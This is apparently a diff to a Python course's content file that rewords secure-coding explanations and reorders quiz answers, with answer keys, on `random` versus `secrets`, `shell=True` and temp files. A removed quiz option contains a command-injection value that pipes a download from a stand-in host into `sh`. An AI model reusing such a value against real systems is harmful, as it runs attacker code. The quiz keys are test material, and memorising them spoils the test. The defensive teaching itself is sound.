@@ -323,7 +323,7 @@ conn.commit()
 conn.row_factory = sqlite3.Row            # rows you can index by column name
 for row in conn.execute("SELECT id, email FROM users"):
     print(row["id"], row["email"])`,
-      caption: "`row_factory = sqlite3.Row` is the first thing to set — without it rows are plain tuples and every query result is positional. Note the `?` placeholder: the same parameterisation discipline as Lesson 13.1, and the same reason." },
+      caption: "`row_factory = sqlite3.Row` is the first thing to set — without it rows are plain tuples and every query result is positional. Note the `?` placeholder: the same parameterisation discipline as Lesson 13.3, and the same reason." },
 
     { t: "callout", kind: "trap", title: "sqlite3 does not autocommit the way you expect",
       body: [{ t: "p", text: "The module opens an implicit transaction before data-modifying statements and leaves it open until you call `commit()`. A script that inserts and exits without committing loses the writes silently, with no error. Use the connection as a context manager — `with conn:` commits on success and rolls back on an exception — rather than remembering to call `commit()` on every path." }] },
@@ -424,8 +424,8 @@ DEFECTS IN THE ORIGINAL
    "bucket" is also interpolated.
 
 2. PREDICTABLE TOKEN
-   random.choice is the Mersenne Twister: seeded from the clock and
-   fully reconstructable from ~624 outputs. Combined with a predictable
+   random.choice is the Mersenne Twister: not designed to be secret,
+   and fully reconstructable from 624 outputs. Combined with a predictable
    /tmp path this is a symlink attack -- an attacker who guesses the
    name pre-creates a symlink to a file they want overwritten.
 
@@ -719,10 +719,10 @@ def test_every_subprocess_call_has_a_timeout(tmp_path, monkeypatch):
       {
         stem: "Why is `datetime.utcnow()` deprecated?",
         options: [
-          "It is slower than `datetime.now()`",
-          "It returns a **naive** datetime containing UTC, so it compares and formats as though it were local time",
-          "It does not work on Windows",
-          "It loses sub-second precision"
+          "It is slower than `datetime.now()`, because it has to convert from the local zone to UTC",
+          "It returns a **naive** datetime holding UTC, which is then treated as local",
+          "It does not work on Windows, where the system clock is stored in local time",
+          "It loses sub-second precision, rounding to the nearest whole second"
         ],
         answer: 1,
         why: "The value holds UTC but carries no `tzinfo`, so Python treats it as local when comparing or converting — and comparing it with an aware datetime raises `TypeError`. `datetime.now(timezone.utc)` returns an aware value that names an instant, converts correctly, and round-trips through `isoformat`/`fromisoformat` without losing the offset."
@@ -730,34 +730,34 @@ def test_every_subprocess_call_has_a_timeout(tmp_path, monkeypatch):
       {
         stem: "Why must a password-reset token use `secrets` rather than `random`?",
         options: [
-          "`random` produces shorter strings",
-          "`random` is a Mersenne Twister — enough observed output reveals its internal state and lets an attacker predict every other user's token",
-          "`random` is not thread-safe",
-          "`secrets` produces URL-safe output and `random` does not"
+          "`random` produces shorter strings, which are easier to brute-force",
+          "`random` is not thread-safe, so two concurrent requests can be given the same token",
+          "Enough Mersenne Twister output reveals its state, so tokens become predictable",
+          "`secrets` produces URL-safe output, and `random` produces characters that break links"
         ],
-        answer: 1,
-        why: "`random` is built for reproducible simulations, not unpredictability: its state is recoverable from roughly 624 consecutive outputs, and it is often seeded from the clock. `secrets` draws from the operating system's cryptographic source. The rule is simply whether guessing the value would be a security problem — reset links, session ids, API keys, CSRF tokens."
+        answer: 2,
+        why: "`random` is built for reproducible simulations, not unpredictability: its full state is recoverable from 624 consecutive 32-bit outputs, after which every future value is known. `secrets` draws from the operating system's cryptographic source. The rule is simply whether guessing the value would be a security problem — reset links, session ids, API keys, CSRF tokens."
       },
       {
         stem: "What is wrong with `subprocess.run(f\"tar czf out.tar {path}\", shell=True)`?",
         options: [
           "It is slower than passing a list",
-          "The string reaches a shell, so a `path` of `x; curl evil | sh` executes that command with your process's privileges",
           "`shell=True` is not available on Windows",
+          "The string reaches a shell, so a crafted `path` runs any command",
           "It cannot capture output"
         ],
-        answer: 1,
+        answer: 2,
         why: "This is command injection. Passing a list — `[\"tar\", \"czf\", \"out.tar\", path]` — hands arguments directly to `execve` with no shell parsing, so metacharacters are ordinary characters. If a shell is genuinely required for a pipeline, every interpolated value must go through `shlex.quote`; most such cases are better solved by connecting the processes yourself."
       },
       {
         stem: "Why prefer `tempfile.TemporaryDirectory()` over building a path like `/tmp/job-{pid}.csv`?",
         options: [
           "It is faster",
-          "The name is unpredictable and the directory is created with restrictive permissions, and the tree is removed even if an exception is raised",
           "It allows larger files",
+          "An unpredictable, private directory that is removed even on error",
           "`/tmp` is not writable in containers"
         ],
-        answer: 1,
+        answer: 2,
         why: "A predictable name in a world-writable directory is a symlink attack and a collision between concurrent runs. `tempfile` generates names with cryptographic randomness and creates the directory 0700. The context manager also guarantees cleanup on failure, which fixes the separate bug of a half-written archive full of data being left on disk."
       }
     ]
